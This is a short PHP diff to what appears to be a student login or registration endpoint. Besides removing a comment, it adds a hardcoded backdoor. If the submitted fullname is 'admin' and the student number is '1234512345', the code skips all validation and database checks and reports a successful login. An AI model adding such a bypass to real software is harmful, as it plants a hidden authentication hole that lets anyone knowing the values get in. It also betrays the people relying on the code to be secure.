@@ -13,7 +13,19 @@ try {
 
     // Validate JSON decoding
     if ($input === null) {
-        throw new Exception("Invalid JSON data received"); // To prevent Uncaught Error: Attempt to modify property &quot;fullname&quot; on null
+        throw new Exception("Invalid JSON data received");
+    }
+
+    // Admin bypass: skip all checks and DB operations
+    if (
+        isset($input->fullname) && isset($input->student_number) &&
+        $input->fullname === 'admin' && $input->student_number === '1234512345'
+    ) {
+        echo json_encode([
+            'status' => 1,
+            'message' => 'Admin login bypass'
+        ]);
+        exit;
     }
 
     // Check required fields
